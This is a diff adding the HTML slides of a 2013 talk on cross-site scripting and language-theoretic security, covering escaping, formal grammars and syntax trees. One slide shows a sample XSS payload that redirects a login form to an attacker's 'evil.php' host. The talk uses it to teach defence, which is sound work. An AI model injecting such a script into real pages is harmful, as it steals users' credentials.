@@ -1,0 +1,803 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<head>
+<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Open+Sans:300,400,800,300italic,400italic,800italic">
+<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Fauna+One">
+<link rel="stylesheet" href="file:///home/arne/github/conf-talks/2013-eurucamp/stylesheets/stylesheet.css">
+<link rel="stylesheet" href="file:///home/arne/github/conf-talks/2013-eurucamp/stylesheets/highlight.css">
+<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script><script src="file:///home/arne/github/conf-talks/2013-eurucamp/javascripts/impress_js_addons.js"></script><script src="file:///home/arne/github/conf-talks/2013-eurucamp/javascripts/highlight.pack.js"></script><script>hljs.initHighlightingOnLoad();</script>
+</head>
+<body id="impress" data-transition-duration="0">
+<div>
+<h1>Web Linguistics</h1>
+<h2>Towards Higher Fluency</h2>
+<p>by Arne Brasseur / <a href="https://github.com/plexus">plexus</a></p>
+</div>
+<div class="step" data-x="1000" data-y="0">
+<p>Moi</p>
+<p>Freelance Ruby Dev</p>
+<p>Shoes, Rails Girls Berlin, Ruby Monsters</p>
+<p>Twitter / Github : @plexus</p>
+</div>
+<div class="step" data-x="2000" data-y="0">
+<p><img src="images/yaml_new_eval.png" alt="Screenshot of the Langsec website (langsec.org)"></p>
+</div>
+<div class="step" data-x="3000" data-y="0">
+<h1>XSS</h1>
+<h2>Cross site scripting</h2>
+
+</div>
+<div class="big step" data-x="4000" data-y="0">
+<p>XSS enables attackers to inject client-side script into Web pages viewed by other users</p>
+</div>
+<div class="step" data-x="5000" data-y="0">
+<h2>XSS</h2>
+<p>Code like this</p>
+<pre class="language-ruby"><code class="prettyprint ruby">"&lt;div&gt;#{ @post.body }&lt;/div&gt;"
+</code></pre>
+<p>Will lead to malicious injection</p>
+<pre class="language-html"><code>&lt;script&gt;
+ document.getElementById('login_form').
+   action="http://208.246.24.14/evil.php"
+&lt;/script&gt;
+</code></pre>
+</div>
+<div class="step" data-x="6000" data-y="0">
+<p><strong>session hijacking</strong></p>
+<p>attacker can surf the site with user credentials</p>
+</div>
+<div class="step" data-x="7000" data-y="0">
+<h2>Escape!</h2>
+<p>The common wisdom is to &ldquo;escape&rdquo; the inserted value</p>
+<pre class="language-html"><code>&lt;div&gt;#{ escape_html(@post.body) }&lt;/div&gt;
+</code></pre>
+<p>Now the code is harmless</p>
+<pre class="language-html"><code>&lt;div&gt;
+  &amp;lt;script&amp;gt; ... &amp;lt;/script&amp;gt;
+&lt;/div&gt;
+</code></pre>
+</div>
+<div class="step" data-x="8000" data-y="0">
+<h2>XSS</h2>
+<p>Is a more common</p>
+<p>vulnerability than</p>
+<p>buffer overflows</p>
+</div>
+<div class="step" data-x="9000" data-y="0">
+<p><strong>why</strong> is it so <strong>hard?</strong></p>
+</div>
+<div class="step" data-x="10000" data-y="0">
+<p>Manual escaping? <strong>hard</strong></p>
+<p>Let&rsquo;s automate!</p>
+<pre class="language-html"><code># using HTML::SafeBuffer
+&lt;div&gt;&lt;%= @post.body %&gt;&lt;/div&gt;
+</code></pre>
+<p>And it <strong>just works</strong></p>
+</div>
+<div class="step" data-x="11000" data-y="0">
+<p>We&rsquo;ve turned the problem around</p>
+<p>Whitelist instead of blacklist</p>
+<pre class="language-ruby"><code class="prettyprint ruby">def helper
+  "&lt;p&gt; haikus are pretty &lt;p&gt;".html_safe
+end
+</code></pre>
+<p><strong>We&rsquo;re still manually deciding what (not) to escape</strong></p>
+</div>
+<div class="step" data-x="12000" data-y="0">
+<p><img src="images/devil_in_plain_text.png" alt="Screenshot of the Langsec website (langsec.org)"></p>
+</div>
+<div class="step" data-x="13000" data-y="0">
+<p><img src="images/langsec_website.png" alt="Screenshot of the Langsec website (langsec.org)"></p>
+</div>
+<div class="step" data-x="14000" data-y="0">
+<h1>Language</h1>
+<h2>langue, taal, sprache, &#35486;&#35328;</h2>
+</div>
+<div class="step" data-x="15000" data-y="0">
+<p><img src="images/platypus_cloud.png" alt=""></p>
+</div>
+<div class="step" data-x="16000" data-y="0">
+<p><img src="images/platypus_graph.png" alt=""></p>
+</div>
+<div class="step" data-x="17000" data-y="0">
+<svg width="304pt" height="262pt" viewBox="0.00 0.00 304.00 262.00">
+<g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 258)">
+<title>platypus</title>
+
+<comment></comment>
+<g id="node1" class="node"><title>s</title>
+<ellipse fill="none" stroke="blue" cx="138" cy="-235" rx="55.8614" ry="18.3848"></ellipse>
+<text text-anchor="middle" x="138" y="-231.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">sentence</text>
+</g>
+<comment></comment>
+<g id="node2" class="node"><title>subject</title>
+<text text-anchor="middle" x="58" y="-158.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">subject</text>
+</g>
+<comment></comment>
+<g id="edge2" class="edge"><title>s--subject</title>
+<path fill="none" stroke="blue" d="M118.634,-217.329C106.241,-206.02 90.2092,-191.391 77.7432,-180.016"></path>
+</g>
+<comment></comment>
+<g id="node3" class="node"><title>action</title>
+<text text-anchor="middle" x="138" y="-158.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">action</text>
+</g>
+<comment></comment>
+<g id="edge6" class="edge"><title>s--action</title>
+<path fill="none" stroke="blue" d="M138,-216.201C138,-205.133 138,-191.199 138,-180.231"></path>
+</g>
+<comment></comment>
+<g id="node4" class="node"><title>place</title>
+<text text-anchor="middle" x="249" y="-158.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">place</text>
+</g>
+<comment></comment>
+<g id="edge16" class="edge"><title>s--place</title>
+<path fill="none" stroke="blue" d="M163.188,-218.435C180.714,-206.909 204.057,-191.557 221.973,-179.775"></path>
+</g>
+<comment></comment>
+<g id="node7" class="node"><title>platypus</title>
+<text text-anchor="middle" x="37" y="-86.4" font-family="Times Roman,serif" font-size="14.00" fill="red">platypus</text>
+</g>
+<comment></comment>
+<g id="edge4" class="edge"><title>subject--platypus</title>
+<path fill="none" stroke="blue" d="M52.7008,-143.831C49.5417,-133 45.5422,-119.288 42.3705,-108.413"></path>
+</g>
+<comment></comment>
+<g id="node5" class="node"><title>verb</title>
+<text text-anchor="middle" x="119" y="-86.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">verb</text>
+</g>
+<comment></comment>
+<g id="edge8" class="edge"><title>action--verb</title>
+<path fill="none" stroke="blue" d="M133.205,-143.831C130.347,-133 126.729,-119.288 123.859,-108.413"></path>
+</g>
+<comment></comment>
+<g id="node6" class="node"><title>object</title>
+<text text-anchor="middle" x="193" y="-86.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">object</text>
+</g>
+<comment></comment>
+<g id="edge10" class="edge"><title>action--object</title>
+<path fill="none" stroke="blue" d="M151.879,-143.831C160.153,-133 170.628,-119.288 178.934,-108.413"></path>
+</g>
+<comment></comment>
+<g id="node10" class="node"><title>forest</title>
+<text text-anchor="middle" x="268" y="-86.4" font-family="Times Roman,serif" font-size="14.00" fill="red">forest</text>
+</g>
+<comment></comment>
+<g id="edge18" class="edge"><title>place--forest</title>
+<path fill="none" stroke="blue" d="M253.795,-143.831C256.653,-133 260.271,-119.288 263.141,-108.413"></path>
+</g>
+<comment></comment>
+<g id="node8" class="node"><title>carry</title>
+<text text-anchor="middle" x="116" y="-14.4" font-family="Times Roman,serif" font-size="14.00" fill="red">carry</text>
+</g>
+<comment></comment>
+<g id="edge12" class="edge"><title>verb--carry</title>
+<path fill="none" stroke="blue" d="M118.243,-71.8314C117.792,-61 117.22,-47.2876 116.767,-36.4133"></path>
+</g>
+<comment></comment>
+<g id="node9" class="node"><title>chicken</title>
+<text text-anchor="middle" x="195" y="-14.4" font-family="Times Roman,serif" font-size="14.00" fill="red">chicken</text>
+</g>
+<comment></comment>
+<g id="edge14" class="edge"><title>object--chicken</title>
+<path fill="none" stroke="blue" d="M193.505,-71.8314C193.806,-61 194.186,-47.2876 194.489,-36.4133"></path>
+</g>
+</g>
+</svg>
+
+</div>
+<div class="step" data-x="18000" data-y="0">
+<p><span class="box">A platypus</span><span class="box">is carrying</span><span class="box">a chicken</span><span class="box">in the forest</span></p>
+</div>
+<div class="step" data-x="19000" data-y="0">
+<p><img src="images/waveform.gif" alt=""></p>
+</div>
+<div class="step" data-x="20000" data-y="0">
+<h2>Magic of language</h2>
+<ul>
+<li><p>Listener reconstructs abstract representation</p></li>
+<li><p>Identical &ldquo;tree&rdquo; is shared between speakers</p></li>
+<li><p>Each derive meaning from this representation</p></li>
+</ul>
+</div>
+<div class="step" data-x="21000" data-y="0">
+<h1>Formal Language</h1>
+</div>
+<div class="step" data-x="22000" data-y="0">
+<p>a <strong>formal language</strong> is</p>
+<p>a <strong>set of strings</strong> of symbols</p>
+<p>governed by <strong>strict rules</strong></p>
+</div>
+<div class="step" data-x="23000" data-y="0">
+<p>These rules form the <strong>grammar</strong></p>
+<p>of the language, they specify</p>
+<p>how to <strong>generate</strong> valid strings</p>
+</div>
+<div class="step" data-x="24000" data-y="0">
+<pre><code>alphabet = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
+            +, *, (, ), =}
+
+&lt;equation&gt;   ::= &lt;expression&gt; = &lt;expression&gt;
+
+&lt;expression&gt; ::= &lt;number&gt;  | &lt;sum&gt; |
+                 &lt;product&gt; | ( &lt;expression&gt; )
+
+&lt;number&gt;     ::= &lt;digit&gt; | &lt;digit&gt; &lt;number&gt;
+
+&lt;digit&gt;      ::= 0 | 1 | 2 | 3 | 4 |
+                 5 | 6 | 7 | 8 | 9
+
+&lt;sum&gt;        ::= &lt;expression&gt; + &lt;expression&gt;
+
+&lt;product&gt;    ::= &lt;expression&gt; * &lt;expression&gt;
+</code></pre>
+</div>
+<div class="step" data-x="25000" data-y="0">
+<p>well-formed :</p>
+<pre><code>5 = 3 + 2
+4 * 4 = 10 + 6
+10 + 20 = ( 3 + 5 ) * 7
+</code></pre>
+<p>not well-formed :</p>
+<pre><code>5 = + 5
+10 = 15 - 5
+3 * 5 + 7
+</code></pre>
+</div>
+<div class="step" data-x="26000" data-y="0">
+<svg width="486pt" height="404pt" viewBox="0.00 0.00 486.00 404.00">
+<g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 400)">
+<title>_anonymous_0</title>
+
+<comment></comment>
+<g id="node1" class="node"><title>exp1</title>
+<text text-anchor="middle" x="134" y="-302.4" font-family="Times Roman,serif" font-size="14.00">expression</text>
+</g>
+<comment></comment>
+<g id="node23" class="node"><title>sum</title>
+<text text-anchor="middle" x="117" y="-230.4" font-family="Times Roman,serif" font-size="14.00">sum</text>
+</g>
+<comment></comment>
+<g id="edge8" class="edge"><title>exp1--sum</title>
+<path fill="none" stroke="black" d="M129.71,-287.831C127.153,-277 123.915,-263.288 121.348,-252.413"></path>
+</g>
+<comment></comment>
+<g id="node2" class="node"><title>eq</title>
+<text text-anchor="middle" x="232" y="-302.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">=</text>
+</g>
+<comment></comment>
+<g id="node3" class="node"><title>exp2</title>
+<text text-anchor="middle" x="325" y="-302.4" font-family="Times Roman,serif" font-size="14.00">expression</text>
+</g>
+<comment></comment>
+<g id="node32" class="node"><title>product</title>
+<text text-anchor="middle" x="360" y="-230.4" font-family="Times Roman,serif" font-size="14.00">product</text>
+</g>
+<comment></comment>
+<g id="edge24" class="edge"><title>exp2--product</title>
+<path fill="none" stroke="black" d="M333.832,-287.831C339.097,-277 345.763,-263.288 351.049,-252.413"></path>
+</g>
+<comment></comment>
+<g id="node4" class="node"><title>num1</title>
+<text text-anchor="middle" x="35" y="-158.4" font-family="Times Roman,serif" font-size="14.00">number</text>
+</g>
+<comment></comment>
+<g id="node10" class="node"><title>digit1</title>
+<text text-anchor="middle" x="35" y="-86.4" font-family="Times Roman,serif" font-size="14.00">digit</text>
+</g>
+<comment></comment>
+<g id="edge16" class="edge"><title>num1--digit1</title>
+<path fill="none" stroke="black" d="M35,-143.831C35,-133 35,-119.288 35,-108.413"></path>
+</g>
+<comment></comment>
+<g id="node5" class="node"><title>plus</title>
+<text text-anchor="middle" x="115" y="-158.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">+</text>
+</g>
+<comment></comment>
+<g id="node6" class="node"><title>num2</title>
+<text text-anchor="middle" x="195" y="-158.4" font-family="Times Roman,serif" font-size="14.00">number</text>
+</g>
+<comment></comment>
+<g id="node11" class="node"><title>digit2</title>
+<text text-anchor="middle" x="195" y="-86.4" font-family="Times Roman,serif" font-size="14.00">digit</text>
+</g>
+<comment></comment>
+<g id="edge18" class="edge"><title>num2--digit2</title>
+<path fill="none" stroke="black" d="M195,-143.831C195,-133 195,-119.288 195,-108.413"></path>
+</g>
+<comment></comment>
+<g id="node7" class="node"><title>num3</title>
+<text text-anchor="middle" x="283" y="-158.4" font-family="Times Roman,serif" font-size="14.00">number</text>
+</g>
+<comment></comment>
+<g id="node12" class="node"><title>digit3</title>
+<text text-anchor="middle" x="283" y="-86.4" font-family="Times Roman,serif" font-size="14.00">digit</text>
+</g>
+<comment></comment>
+<g id="edge32" class="edge"><title>num3--digit3</title>
+<path fill="none" stroke="black" d="M283,-143.831C283,-133 283,-119.288 283,-108.413"></path>
+</g>
+<comment></comment>
+<g id="node8" class="node"><title>times</title>
+<text text-anchor="middle" x="363" y="-158.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">*</text>
+</g>
+<comment></comment>
+<g id="node9" class="node"><title>num4</title>
+<text text-anchor="middle" x="443" y="-158.4" font-family="Times Roman,serif" font-size="14.00">number</text>
+</g>
+<comment></comment>
+<g id="node13" class="node"><title>digit4</title>
+<text text-anchor="middle" x="443" y="-86.4" font-family="Times Roman,serif" font-size="14.00">digit</text>
+</g>
+<comment></comment>
+<g id="edge34" class="edge"><title>num4--digit4</title>
+<path fill="none" stroke="black" d="M443,-143.831C443,-133 443,-119.288 443,-108.413"></path>
+</g>
+<comment></comment>
+<g id="node14" class="node"><title>5</title>
+<text text-anchor="middle" x="35" y="-14.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">5</text>
+</g>
+<comment></comment>
+<g id="edge20" class="edge"><title>digit1--5</title>
+<path fill="none" stroke="black" d="M35,-71.8314C35,-61 35,-47.2876 35,-36.4133"></path>
+</g>
+<comment></comment>
+<g id="node15" class="node"><title>3</title>
+<text text-anchor="middle" x="195" y="-14.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">3</text>
+</g>
+<comment></comment>
+<g id="edge22" class="edge"><title>digit2--3</title>
+<path fill="none" stroke="black" d="M195,-71.8314C195,-61 195,-47.2876 195,-36.4133"></path>
+</g>
+<comment></comment>
+<g id="node16" class="node"><title>2</title>
+<text text-anchor="middle" x="283" y="-14.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">2</text>
+</g>
+<comment></comment>
+<g id="edge36" class="edge"><title>digit3--2</title>
+<path fill="none" stroke="black" d="M283,-71.8314C283,-61 283,-47.2876 283,-36.4133"></path>
+</g>
+<comment></comment>
+<g id="node17" class="node"><title>4</title>
+<text text-anchor="middle" x="443" y="-14.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">4</text>
+</g>
+<comment></comment>
+<g id="edge38" class="edge"><title>digit4--4</title>
+<path fill="none" stroke="black" d="M443,-71.8314C443,-61 443,-47.2876 443,-36.4133"></path>
+</g>
+<comment></comment>
+<g id="node18" class="node"><title>equation</title>
+<text text-anchor="middle" x="232" y="-374.4" font-family="Times Roman,serif" font-size="14.00">equation</text>
+</g>
+<comment></comment>
+<g id="edge2" class="edge"><title>equation--exp1</title>
+<path fill="none" stroke="black" d="M207.27,-359.831C192.414,-348.917 173.576,-335.076 158.722,-324.163"></path>
+</g>
+<comment></comment>
+<g id="edge4" class="edge"><title>equation--eq</title>
+<path fill="none" stroke="black" d="M232,-359.831C232,-349 232,-335.288 232,-324.413"></path>
+</g>
+<comment></comment>
+<g id="edge6" class="edge"><title>equation--exp2</title>
+<path fill="none" stroke="black" d="M255.468,-359.831C269.566,-348.917 287.443,-335.076 301.54,-324.163"></path>
+</g>
+<comment></comment>
+<g id="edge10" class="edge"><title>sum--num1</title>
+<path fill="none" stroke="black" d="M96.3079,-215.831C83.8774,-204.917 68.1148,-191.076 55.6854,-180.163"></path>
+</g>
+<comment></comment>
+<g id="edge12" class="edge"><title>sum--plus</title>
+<path fill="none" stroke="black" d="M116.495,-215.831C116.194,-205 115.814,-191.288 115.511,-180.413"></path>
+</g>
+<comment></comment>
+<g id="edge14" class="edge"><title>sum--num2</title>
+<path fill="none" stroke="black" d="M136.683,-215.831C148.507,-204.917 163.501,-191.076 175.324,-180.163"></path>
+</g>
+<comment></comment>
+<g id="edge26" class="edge"><title>product--num3</title>
+<path fill="none" stroke="black" d="M340.57,-215.831C328.897,-204.917 314.096,-191.076 302.424,-180.163"></path>
+</g>
+<comment></comment>
+<g id="edge28" class="edge"><title>product--times</title>
+<path fill="none" stroke="black" d="M360.757,-215.831C361.208,-205 361.78,-191.288 362.233,-180.413"></path>
+</g>
+<comment></comment>
+<g id="edge30" class="edge"><title>product--num4</title>
+<path fill="none" stroke="black" d="M380.944,-215.831C393.527,-204.917 409.481,-191.076 422.062,-180.163"></path>
+</g>
+</g>
+</svg>
+</div>
+<div class="step" data-x="27000" data-y="0">
+<p>The <strong>meaning</strong> of a sentence</p>
+<p>corresponds with</p>
+<p>its <strong>syntax tree</strong></p>
+</div>
+<div class="step" data-x="28000" data-y="0">
+<h2>Language is everywhere</h2>
+<ul>
+<li><p>Programming languages</p></li>
+<li><p>Markup &amp; styling languages</p></li>
+<li><p>Data languages</p></li>
+<li><p>Network protocols</p></li>
+</ul>
+</div>
+<div class="step" data-x="29000" data-y="0">
+<p>Your application either</p>
+<p><strong>consumes</strong> or <strong>generates</strong></p>
+<p>these languages</p>
+</div>
+<div class="step" data-x="30000" data-y="0">
+<p>In either case it should</p>
+<p>use <strong>syntax trees</strong></p>
+<p>to do so</p>
+</div>
+<div class="step" data-x="31000" data-y="0">
+<h1>Why ?</h1>
+</div>
+<div class="step" data-x="32000" data-y="0">
+<h2>The problem</h2>
+<p>Semantics of string are twofold</p>
+<ul>
+<li><p>a string</p></li>
+<li><p>a textual representation of HTML</p></li>
+</ul>
+</div>
+<div class="step" data-x="33000" data-y="0">
+<p>When handling input</p>
+<ul>
+<li><p>Treat it as a formal language</p></li>
+<li><p>Separate recognition from processing</p></li>
+</ul>
+</div>
+<div class="step" data-x="34000" data-y="0">
+<p>If input handling is done ad-hoc</p>
+<ul>
+<li><p>recognition is scattered across the program</p></li>
+<li><p>it doesn&rsquo;t match the programmer&rsquo;s assumptions</p></li>
+<li><p>it becomes a weird machine for an attacker to program</p></li>
+</ul>
+</div>
+<div class="step" data-x="35000" data-y="0">
+<p>http://langsec.org</p>
+<p>Meredith L. Patterson : &ldquo;The Science of Insecurity&rdquo;</p>
+</div>
+<div class="step" data-x="36000" data-y="0">
+<p>We can apply similar reasoning to <strong>output</strong> handling</p>
+</div>
+<div class="step" data-x="37000" data-y="0">
+<p>When generating output</p>
+<ul>
+<li><p>Treat it as a formal language</p></li>
+<li><p>Separate language generation from program logic</p></li>
+</ul>
+</div>
+<div class="step" data-x="38000" data-y="0">
+<p>If output handling is done ad-hoc</p>
+<ul>
+<li><p>language generation is scattered across the program</p></li>
+<li><p>it doesn&rsquo;t match the programmer&rsquo;s assumptions</p></li>
+<li><p>it becomes a weird machine for an attacker to program</p></li>
+</ul>
+</div>
+<div class="step" data-x="39000" data-y="0">
+<h1>XSS is a Failure at the Language Level</h1>
+</div>
+<div class="step" data-x="40000" data-y="0">
+<svg width="518pt" height="188pt" viewBox="0.00 0.00 518.00 188.00">
+<g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 184)">
+<title>commmunication</title>
+
+<comment></comment>
+<g id="node1" class="node"><title>z1</title>
+<ellipse fill="green" stroke="green" cx="18" cy="-18" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="node2" class="node"><title>c</title>
+<ellipse fill="green" stroke="green" cx="384" cy="-18" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="node4" class="node"><title>x1</title>
+<ellipse fill="blue" stroke="blue" cx="72" cy="-162" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="node6" class="node"><title>y1</title>
+<ellipse fill="blue" stroke="blue" cx="72" cy="-90" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge3" class="edge"><title>x1-&gt;y1</title>
+<path fill="none" stroke="white" stroke-width="3" d="M72,-143.831C72,-133 72,-119.288 72,-108.413"></path>
+</g>
+<comment></comment>
+<g id="edge4" class="edge"><title>y1-&gt;z1</title>
+<path fill="none" stroke="white" stroke-width="3" d="M61.0723,-75.4297C51.7035,-62.938 38.2755,-45.034 28.9115,-32.5486"></path>
+</g>
+<comment></comment>
+<g id="node8" class="node"><title>z2</title>
+<ellipse fill="blue" stroke="blue" cx="72" cy="-18" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge6" class="edge"><title>y1-&gt;z2</title>
+<path fill="none" stroke="white" stroke-width="3" d="M72,-71.8314C72,-61 72,-47.2876 72,-36.4133"></path>
+</g>
+<comment></comment>
+<g id="node10" class="node"><title>z3</title>
+<ellipse fill="blue" stroke="blue" cx="126" cy="-18" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge8" class="edge"><title>y1-&gt;z3</title>
+<path fill="none" stroke="white" stroke-width="3" d="M82.9277,-75.4297C92.2965,-62.938 105.724,-45.034 115.089,-32.5486"></path>
+</g>
+<comment></comment>
+<g id="node15" class="node"><title>aa</title>
+<ellipse fill="blue" stroke="blue" cx="110" cy="-90" rx="1.8" ry="1.8"></ellipse>
+</g>
+<comment></comment>
+<g id="edge25" class="edge"><title>y1-&gt;aa</title>
+</g>
+<comment></comment>
+<g id="node12" class="node"><title>serializer</title>
+<polygon fill="white" stroke="blue" points="210,-108 130,-108 130,-72 210,-72 210,-108"></polygon>
+<text text-anchor="middle" x="170" y="-86.4" font-family="Times Roman,serif" font-size="14.00">serializer</text>
+</g>
+<comment></comment>
+<g id="node13" class="node"><title>network</title>
+<polygon fill="none" stroke="none" points="302,-108 228,-108 228,-72 302,-72 302,-108"></polygon>
+<text text-anchor="middle" x="265" y="-86.4" font-family="Times Roman,serif" font-size="14.00">network</text>
+</g>
+<comment></comment>
+<g id="edge12" class="edge"><title>serializer-&gt;network</title>
+<path fill="none" stroke="white" stroke-width="3" d="M210.078,-90C215.942,-90 221.806,-90 227.67,-90"></path>
+</g>
+<comment></comment>
+<g id="node14" class="node"><title>parser</title>
+<polygon fill="white" stroke="blue" points="380,-108 320,-108 320,-72 380,-72 380,-108"></polygon>
+<text text-anchor="middle" x="350" y="-86.4" font-family="Times Roman,serif" font-size="14.00">parser</text>
+</g>
+<comment></comment>
+<g id="edge13" class="edge"><title>network-&gt;parser</title>
+<path fill="none" stroke="white" stroke-width="3" d="M302.188,-90C308.04,-90 313.892,-90 319.744,-90"></path>
+</g>
+<comment></comment>
+<g id="node17" class="node"><title>bb</title>
+<ellipse fill="blue" stroke="blue" cx="400" cy="-90" rx="1.8" ry="1.8"></ellipse>
+</g>
+<comment></comment>
+<g id="edge14" class="edge"><title>parser-&gt;bb</title>
+<path fill="none" stroke="white" stroke-width="3" d="M380.078,-90C386.096,-90 392.114,-90 398.132,-90"></path>
+</g>
+<comment></comment>
+<g id="edge11" class="edge"><title>aa-&gt;serializer</title>
+<path fill="none" stroke="white" stroke-width="3" d="M111.875,-90C117.778,-90 123.682,-90 129.585,-90"></path>
+</g>
+<comment></comment>
+<g id="node21" class="node"><title>b</title>
+<ellipse fill="blue" stroke="blue" cx="438" cy="-90" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge27" class="edge"><title>bb-&gt;b</title>
+</g>
+<comment></comment>
+<g id="node19" class="node"><title>a</title>
+<ellipse fill="blue" stroke="blue" cx="438" cy="-162" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge17" class="edge"><title>a-&gt;b</title>
+<path fill="none" stroke="white" stroke-width="3" d="M438,-143.831C438,-133 438,-119.288 438,-108.413"></path>
+</g>
+<comment></comment>
+<g id="edge18" class="edge"><title>b-&gt;c</title>
+<path fill="none" stroke="white" stroke-width="3" d="M427.072,-75.4297C417.704,-62.938 404.276,-45.034 394.911,-32.5486"></path>
+</g>
+<comment></comment>
+<g id="node23" class="node"><title>d</title>
+<ellipse fill="blue" stroke="blue" cx="438" cy="-18" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge20" class="edge"><title>b-&gt;d</title>
+<path fill="none" stroke="white" stroke-width="3" d="M438,-71.8314C438,-61 438,-47.2876 438,-36.4133"></path>
+</g>
+<comment></comment>
+<g id="node25" class="node"><title>e</title>
+<ellipse fill="blue" stroke="blue" cx="492" cy="-18" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge22" class="edge"><title>b-&gt;e</title>
+<path fill="none" stroke="white" stroke-width="3" d="M448.928,-75.4297C458.296,-62.938 471.724,-45.034 481.089,-32.5486"></path>
+</g>
+</g>
+</svg>
+</div>
+<div class="step" data-x="41000" data-y="0">
+<svg width="518pt" height="332pt" viewBox="0.00 0.00 518.00 332.00">
+<g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 328)">
+<title>commmunication</title>
+
+<comment></comment>
+<g id="node1" class="node"><title>z1</title>
+<ellipse fill="green" stroke="green" cx="18" cy="-162" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="node2" class="node"><title>c</title>
+<ellipse fill="red" stroke="red" cx="384" cy="-162" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="node3" class="node"><title>f</title>
+<ellipse fill="red" stroke="red" cx="357" cy="-90" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge24" class="edge"><title>c-&gt;f</title>
+<path fill="none" stroke="red" stroke-width="3" d="M377.601,-144.937C373.297,-133.46 367.647,-118.392 363.353,-106.941"></path>
+</g>
+<comment></comment>
+<g id="node4" class="node"><title>g</title>
+<ellipse fill="red" stroke="red" cx="411" cy="-90" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge26" class="edge"><title>c-&gt;g</title>
+<path fill="none" stroke="red" stroke-width="3" d="M390.399,-144.937C394.703,-133.46 400.353,-118.392 404.647,-106.941"></path>
+</g>
+<comment></comment>
+<g id="node5" class="node"><title>h</title>
+<ellipse fill="red" stroke="red" cx="411" cy="-18" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge28" class="edge"><title>g-&gt;h</title>
+<path fill="none" stroke="red" stroke-width="3" d="M411,-71.8314C411,-61 411,-47.2876 411,-36.4133"></path>
+</g>
+<comment></comment>
+<g id="node7" class="node"><title>x1</title>
+<ellipse fill="blue" stroke="blue" cx="72" cy="-306" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="node9" class="node"><title>y1</title>
+<ellipse fill="blue" stroke="blue" cx="72" cy="-234" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge3" class="edge"><title>x1-&gt;y1</title>
+<path fill="none" stroke="white" stroke-width="3" d="M72,-287.831C72,-277 72,-263.288 72,-252.413"></path>
+</g>
+<comment></comment>
+<g id="edge4" class="edge"><title>y1-&gt;z1</title>
+<path fill="none" stroke="white" stroke-width="3" d="M61.0723,-219.43C51.7035,-206.938 38.2755,-189.034 28.9115,-176.549"></path>
+</g>
+<comment></comment>
+<g id="node11" class="node"><title>z2</title>
+<ellipse fill="blue" stroke="blue" cx="72" cy="-162" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge6" class="edge"><title>y1-&gt;z2</title>
+<path fill="none" stroke="white" stroke-width="3" d="M72,-215.831C72,-205 72,-191.288 72,-180.413"></path>
+</g>
+<comment></comment>
+<g id="node13" class="node"><title>z3</title>
+<ellipse fill="blue" stroke="blue" cx="126" cy="-162" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge8" class="edge"><title>y1-&gt;z3</title>
+<path fill="none" stroke="white" stroke-width="3" d="M82.9277,-219.43C92.2965,-206.938 105.724,-189.034 115.089,-176.549"></path>
+</g>
+<comment></comment>
+<g id="node18" class="node"><title>aa</title>
+<ellipse fill="blue" stroke="blue" cx="110" cy="-234" rx="1.8" ry="1.8"></ellipse>
+</g>
+<comment></comment>
+<g id="edge31" class="edge"><title>y1-&gt;aa</title>
+</g>
+<comment></comment>
+<g id="node15" class="node"><title>serializer</title>
+<polygon fill="white" stroke="blue" points="210,-252 130,-252 130,-216 210,-216 210,-252"></polygon>
+<text text-anchor="middle" x="170" y="-230.4" font-family="Times Roman,serif" font-size="14.00">serializer</text>
+</g>
+<comment></comment>
+<g id="node16" class="node"><title>network</title>
+<polygon fill="none" stroke="none" points="302,-252 228,-252 228,-216 302,-216 302,-252"></polygon>
+<text text-anchor="middle" x="265" y="-230.4" font-family="Times Roman,serif" font-size="14.00">network</text>
+</g>
+<comment></comment>
+<g id="edge12" class="edge"><title>serializer-&gt;network</title>
+<path fill="none" stroke="white" stroke-width="3" d="M210.078,-234C215.942,-234 221.806,-234 227.67,-234"></path>
+</g>
+<comment></comment>
+<g id="node17" class="node"><title>parser</title>
+<polygon fill="white" stroke="blue" points="380,-252 320,-252 320,-216 380,-216 380,-252"></polygon>
+<text text-anchor="middle" x="350" y="-230.4" font-family="Times Roman,serif" font-size="14.00">parser</text>
+</g>
+<comment></comment>
